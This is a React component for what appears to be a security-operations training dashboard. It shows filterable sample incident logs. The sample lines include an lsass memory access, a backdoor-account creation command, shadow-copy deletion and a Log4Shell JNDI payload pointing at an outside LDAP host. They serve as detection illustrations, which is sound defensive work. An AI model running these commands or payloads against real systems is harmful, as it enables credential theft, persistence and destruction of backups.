import React, { useState } from 'react';
import { Search, Copy, Download } from 'lucide-react';

const SAMPLE_LOGS = [
  '2024-01-15T10:23:44Z win10-victim sysmon[1234]: EventID=10 TargetImage=C:\\Windows\\System32\\lsass.exe SourceImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe GrantedAccess=0x1FFFFF CallTrace=C:\\Windows\\SYSTEM32\\ntdll.dll',
  '2024-01-15T10:23:46Z win10-victim sysmon[1234]: EventID=1 Image=C:\\Windows\\System32\\net.exe CommandLine="net user backdooruser P@ss123! /add" User=SYSTEM ParentImage=powershell.exe',
  '2024-01-15T10:24:02Z win10-victim sysmon[1234]: EventID=1 Image=C:\\Windows\\System32\\vssadmin.exe CommandLine="vssadmin.exe delete shadows /all /quiet" User=backdooruser',
  '2024-01-15T10:24:15Z ubuntu-webserver apache2[5678]: 198.51.100.99 - - [15/Jan/2024:10:24:15 +0000] "GET / HTTP/1.1" 200 1234 "-" "\${jndi:ldap://198.51.100.99:1389/a}"',
  '2024-01-15T10:18:30Z ubuntu-webserver sshd[9012]: Failed password for root from 203.0.113.45 port 54321 ssh2',
  '2024-01-15T10:18:31Z ubuntu-webserver sshd[9012]: Failed password for root from 203.0.113.45 port 54322 ssh2',
  '2024-01-15T10:18:32Z ubuntu-webserver sshd[9012]: Failed password for admin from 203.0.113.45 port 54323 ssh2',
];

export default function RawLogsTab() {
  const [search, setSearch] = useState('');
  const filtered = search
    ? SAMPLE_LOGS.filter(l => l.toLowerCase().includes(search.toLowerCase()))
    : SAMPLE_LOGS;

  const download = () => {
    const blob = new Blob([filtered.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'incident_logs.txt';
    a.click(); URL.revokeObjectURL(url);
  };

  return (
    <div style={{ display:'flex', flexDirection:'column', gap:12 }}>
      <div style={{ display:'flex', gap:8, alignItems:'center' }}>
        <div style={{ position:'relative', flex:1 }}>
          <Search size={12} color="#4a6090" style={{
            position:'absolute', left:9, top:'50%', transform:'translateY(-50%)',
          }} />
          <input className="soc-input" value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Filter log lines…"
            style={{ paddingLeft:28, height:30, fontSize:12 }}
          />
        </div>
        <button className="btn-cyber btn-ghost"
          style={{ fontSize:12, padding:'5px 12px' }}
          onClick={download}>
          <Download size={13} /> Export
        </button>
      </div>

      <div style={{
        background:'rgba(0,0,0,0.4)',
        border:'1px solid #1a2744', borderRadius:8,
        padding:'12px 14px', fontFamily:'JetBrains Mono,monospace',
        fontSize:11, color:'#00e5ff', lineHeight:1.8,
        overflowX:'auto', maxHeight:480,
      }}>
        {filtered.map((line, i) => (
          <div key={i} style={{
            padding:'3px 0',
            borderBottom:'1px solid rgba(26,39,68,0.5)',
            display:'flex', gap:12, alignItems:'flex-start',
          }}>
            <span style={{ color:'#3d5080', fontSize:10, flexShrink:0, paddingTop:1 }}>
              {String(i+1).padStart(3,'0')}
            </span>
            <span style={{ wordBreak:'break-all' }}>{line}</span>
          </div>
        ))}
        {filtered.length === 0 && (
          <div style={{ color:'#3d5080', fontSize:12 }}>No matching log lines</div>
        )}
      </div>

      <div style={{ fontSize:11.5, color:'#3d5080' }}>
        Showing {filtered.length} of {SAMPLE_LOGS.length} log entries
      </div>
    </div>
  );
}